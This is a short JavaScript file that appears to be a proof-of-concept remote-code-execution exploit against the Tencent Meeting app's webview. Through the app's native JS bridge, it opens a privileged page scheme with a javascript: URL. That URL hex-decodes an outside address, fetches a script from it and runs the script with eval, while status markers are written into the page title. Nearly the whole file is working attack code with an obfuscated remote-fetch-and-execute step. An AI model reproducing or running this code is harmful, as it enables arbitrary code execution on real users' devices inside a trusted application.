(function(){
  document.title='P124TB:'+location.host;
  window.__p=function(r){
    try{r=typeof r==='string'?JSON.parse(r):r}catch(e){}
    document.title='P124CB:'+(r&&r.callId)+':'+location.host+':'+ (r&&r.code)+':'+String(r&&r.message||JSON.stringify(r&&r.data||{})).slice(0,80);
  };
  function c(id,mod,m,p){
    try{
      window.JSCallJavaMgr.JSCallNative(JSON.stringify({
        callback:'window.__p',module:mod,method:m,param:p,callId:id
      }));
    }catch(e){
      document.title='P124TB-NOJS:'+location.host;
    }
  }
  if(!window.JSCallJavaMgr){document.title='P124TB-NOMGR:'+location.host;return}
  var official='https://meeting.tencent.com/v2/webview/keep-app-alive';
  var js="javascript:void(function(){var h='68747470733a2f2f6769747768732e6769746875622e696f2f776d2d706f632d7263652f703132346d61696e2e6a73';var u='';for(var i=0;i<h.length;i+=2)u+=String.fromCharCode(parseInt(h.substr(i,2),16));fetch(u).then(function(r){return r.text()}).then(eval)})()";
  var sch='wemeet://page/pay/main_process_webview';
  var q=[
    ['H2','CommonPlugin','GetPerformance',{}],
    ['OP','CommonPlugin','OpenNewPage',{
      scheme:sch,
      router_params:{url:official}
    }],
    ['JS','CommonPlugin','OpenNewPage',{
      scheme:sch,
      action_flag:32,
      router_params:{url:js}
    }]
  ];
  var i=0;
  function n(){
    if(i>=q.length){document.title='P124TB-DONE:'+location.host;return}
    var x=q[i++];
    document.title='P124-RUN:'+x[0];
    c(x[0],x[1],x[2],x[3]);
    setTimeout(n, 4000);
  }
  setTimeout(n, 800);
})();
